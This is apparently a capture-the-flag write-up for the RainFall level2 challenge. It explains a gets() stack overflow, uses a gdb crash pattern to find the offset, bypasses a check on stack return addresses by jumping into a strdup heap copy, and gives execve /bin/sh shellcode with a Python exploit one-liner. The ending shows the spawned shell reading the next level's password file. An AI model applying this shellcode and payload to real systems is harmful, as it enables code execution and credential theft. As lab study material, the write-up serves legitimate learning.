The function gets(buf) does not check input size (stack buffer overflow).

```
   char* p()
   {
      char input[80];

      fflush(stdout);
      gets(input);

      void* return_address = builtin_return_address(0);
      if (((unsigned long)return_address & 0xB0000000) != 0xB0000000) 
      {
         puts(input);
         return strdup(input);
      }

      printf("(%p)\n", return_address);
      exit(1);
   }

   int main(int argc, char** argv, char** envp) 
   {
      return (int)p();
   }
```

We use a pattern to crash the program and find the exact offset to the return address.

```
   (gdb) run
   Starting program: /home/user/level2/level2 
   Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag
   Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0A6Ac72Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag

   Program received signal SIGSEGV, Segmentation fault.
   0x37634136 in ?? ()
```

The offset to overwrite the return address is 80 bytes.

the problem here is that It checks if the return address points to the stack (which often starts at 0xb... on Linux/x86).

```
   if (((unsigned long)return_address & 0xB0000000) != 0xB0000000) 
   {
      puts(input);
      return strdup(input);
   }
```

so we gone try to Put shellcode in the heap (via strdup(input)), And redirecting execution to that heap address.

```
shellcode="\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80"
```

the address of strdup

```
   ltrace ./level2
   __libc_start_main(0x804853f, 1, 0xbffff7f4, 0x8048550, 0x80485c0 <unfinished ...>
   fflush(0xb7fd1a20) = 0
   gets(0xbffff6fc, 0, 0, 0xb7e5ec73, 0x80482b5) = 0xbffff6fc
   puts("") = 1
   strdup("") = 0x0804a008
   +++ exited (status 8) +++
```

so the address of strdup is 0x0804a008 in little-indian \x08\xa0\x04\x08

```
   (python -c 'print("\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "A"*59 + "\x08\xa0\x04\x08")'; cat) | ./level2
```

21 byte of shellcode + A * 59 = 80

```
   level2@RainFall:~$ (python -c 'print("\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "A"*59 + "\x08\xa0\x04\x08")'; cat) | ./level2
   j
   X�Rh//shh/bin��1�̀AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�
   whoami
   level3
   cat /home/user/level3/.pass
   492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
```